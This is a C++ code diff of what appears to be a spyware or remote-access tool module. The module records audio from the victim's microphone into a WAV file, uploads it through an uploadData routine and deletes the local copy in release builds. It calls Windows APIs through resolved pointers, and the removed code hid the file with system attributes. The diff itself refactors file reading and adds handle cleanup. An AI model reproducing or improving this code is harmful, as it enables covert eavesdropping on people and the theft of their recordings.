@@ -11,6 +11,7 @@ File to read sound from sound card and record it to a file in PCM format.
 #include "../network/NetWorkdata.h"
 #include "../log.h"
 #include "../StrHelper.h"
+#include "../FileHelper.h"
 
 #pragma comment(lib, "winmm.lib")
 
@@ -29,38 +30,16 @@ char strFilePath[MAX_PATH] = { 0 };
 
 int SendSoundRecord(char* szWavName)
 {
-	HANDLE hFile = lpCreateFileA(szWavName, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
-	if (hFile == INVALID_HANDLE_VALUE)
+	int iRet = 0;
+	char* filedata = 0;
+	int filesize = 0;
+	iRet = FileHelper::fileReader(szWavName, &filedata, &filesize);
+	if (filesize)
 	{
-		return FALSE;
+		iRet = uploadData(filedata, filesize, SOUNDRECORD, szWavName);
+		delete[] filedata;
 	}
 
-	int iRet = lpSetFilePointer(hFile, 0, 0, FILE_BEGIN);
-	if (iRet == INVALID_SET_FILE_POINTER)
-	{
-		lpCloseHandle(hFile);
-		return FALSE;
-	}
-
-	DWORD dwFileSizeHigh = 0;
-	DWORD dwFileSize = lpGetFileSize(hFile, &dwFileSizeHigh);
-
-	DWORD dwCnt = 0;
-	char* lpBuf = new char[dwFileSize + 0x1000];
-	if (lpBuf == 0)
-	{
-		lpCloseHandle(hFile);
-		return FALSE;
-	}
-
-	iRet = lpReadFile(hFile, lpBuf, dwFileSize, &dwCnt, 0);
-	lpCloseHandle(hFile);
-	if (iRet && dwCnt == dwFileSize)
-	{
-		iRet = uploadData(lpBuf, dwFileSize, SOUNDRECORD, szWavName);
-	}
-
-	delete[] lpBuf;
 #ifndef _DEBUG
 	lpDeleteFileA(szWavName);
 #endif
@@ -137,7 +116,6 @@ DWORD WINAPI waveInProc(void* threadControls)
 						if (errorResult)
 						{
 							//printf("Can't Close Wave Device!\n");
-							//getchar();
 						}
 						return FALSE;
 						inFORMATION->recordingStatus = REC_STATUS_FINISHING;
@@ -170,13 +148,11 @@ int CreateWaveFile()
 	char strFileName[MAX_PATH];
 	lpwsprintfA(strFileName, SOUNDCARD_RECORD_FILENAME, stSt.wYear, stSt.wMonth, stSt.wDay, stSt.wHour, stSt.wMinute, stSt.wSecond);
 
-
 	int iRet = makeFullFileName(strFilePath, strFileName);
 	m_hFile = lpmmioOpenA(strFilePath, NULL, MMIO_CREATE | MMIO_WRITE | MMIO_EXCLUSIVE | MMIO_ALLOCBUF);
 	if (m_hFile == NULL)
 	{
 		return FALSE;
-		//return getchar();
 	}
 
 	m_MMCKInfoParent.fccType = mmioFOURCC('W', 'A', 'V', 'E');
@@ -203,28 +179,26 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 	{
 		MMRESULT errorResult = 0;
 		SoundThreadInfo soundIn;
-		HANDLE inWaveThreadHandle;                //线程
+		HANDLE inWavehThread;                //线程
 		int x = 0;                                //计数器
 		soundIn.recordingStatus = 0;              //设置录音状态
 		soundIn.buffers_left = IN_BUFFERS_NUMBER; //设置预期缓冲数量
 
-		inWaveThreadHandle = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)waveInProc,/*参数*/ &soundIn, 0, (LPDWORD)&errorResult);   //创建线程
-		if (!inWaveThreadHandle)
+		inWavehThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)waveInProc, &soundIn, 0, (LPDWORD)&errorResult);
+		if (!inWavehThread)
 		{
-			writeLog("SoundRecord lpCreateThread error\r\n");
-			//printf("Can't create sound in thread! -- %08X\n",lpRtlGetLastWin32Error());
+			writeLog("SoundRecord lpCreateThread error:%d\r\n", lpRtlGetLastWin32Error());
 			return FALSE;
 		}
-		lpCloseHandle(inWaveThreadHandle);        //关闭线程
+		lpCloseHandle(inWavehThread);
 
-		for (x = 0; x < IN_BUFFERS_NUMBER; x++)   //清空缓存
+		for (x = 0; x < IN_BUFFERS_NUMBER; x++)
 		{
 			ZeroMemory(&soundIn.buffers[x], SIZE_OF_WAVEHDR);
 		}
 
-		//设置 waveFormat
 		sampleFormat.wFormatTag = WAVE_FORMAT_PCM;
-		sampleFormat.nChannels = SOUND_RECORD_CHANNELS_NUMBER;  //声道
+		sampleFormat.nChannels = SOUND_RECORD_CHANNELS_NUMBER;				//声道
 		sampleFormat.nSamplesPerSec = SOUND_RECORD_SAMPLES_PER_SEC;
 		sampleFormat.wBitsPerSample = SOUND_RECORD_BITS_PER_SAMPLE;
 		sampleFormat.nBlockAlign = sampleFormat.nChannels * (sampleFormat.wBitsPerSample >> 3);
@@ -236,10 +210,8 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 			return FALSE;
 		}
 
-		//分配 memory sound in buffers.
 		for (x = 0; x < IN_BUFFERS_NUMBER; x++)  //this loop is not need after testing
 		{                                        //can be replaced with hard coded buffer allocation
-			//clear waveheaders
 			ZeroMemory(&soundIn.buffers[x], SIZE_OF_WAVEHDR);
 			soundIn.buffers[x].dwBufferLength = sampleFormat.nAvgBytesPerSec * iDelayTime;  //内存大小估计一块
 			soundIn.buffers[x].dwFlags = 0;
@@ -247,27 +219,25 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 
 			if (soundIn.buffers[x].lpData == NULL)
 			{
-				//printf("Sound In Buffer number %d failed to get allocate memory.\n",x);
 				for (--x; x; x--) // start 1 down, and while x!=0 x--
 				{
 					lpVirtualFree(soundIn.buffers[x].lpData, 0, MEM_RELEASE); //释放内存
 				}
-				writeLog("SoundRecord buffers error\r\n");
+				writeLog("SoundRecord lpVirtualAlloc error\r\n");
+
+				lpmmioClose(m_hFile, 0);
+
 				return FALSE;
-			}
-			else
-			{
-				//printf(" %d Buffer Application  sucsess\n",x);
 			}
 		}
 
-		//open wave device
 		errorResult = lpwaveInOpen(&soundIn.inWaveDevice, WAVE_MAPPER, &sampleFormat, (DWORD)errorResult, 0, CALLBACK_THREAD);
 		if (errorResult != MMSYSERR_NOERROR)
 		{
 			writeLog("SoundRecord lpwaveInOpen error\r\n");
+
 			FreeBuffers(soundIn.buffers);
-			//return getchar();
+			lpmmioClose(m_hFile, 0);
 			return FALSE;
 		}
 
@@ -279,6 +249,7 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 			{
 				//printf("Failed to prepare header %d. Error %d\n",x,errorResult);
 				FreeBuffers(soundIn.buffers);
+				lpmmioClose(m_hFile, 0);
 				errorResult = lpwaveInClose(soundIn.inWaveDevice);
 				if (errorResult)
 				{
@@ -303,7 +274,7 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 						//printf("Can't Close Wave Device!\n");
 						//getchar();
 					}
-
+					lpmmioClose(m_hFile, 0);
 					writeLog("SoundRecord lpwaveInAddBuffer error\r\n");
 					return FALSE;
 				}
@@ -320,7 +291,7 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 		{
 			//wait for user to stop recording
 			//printf("Hit any key to stop recording.\n");
-			//getchar();
+
 			soundIn.recordingStatus = REC_STATUS_FINISHING;
 		}
 		else
@@ -372,11 +343,9 @@ int __stdcall SoundRecord(unsigned long DelayTime)
 		if (errorResult)
 		{
 			//printf("Can't Close Wave Device!\n");
-			//getchar();
 		}
 
 		lpmmioClose(m_hFile, 0);
-		//return getchar();
 
 		SendSoundRecord(strFilePath);
 		return TRUE;
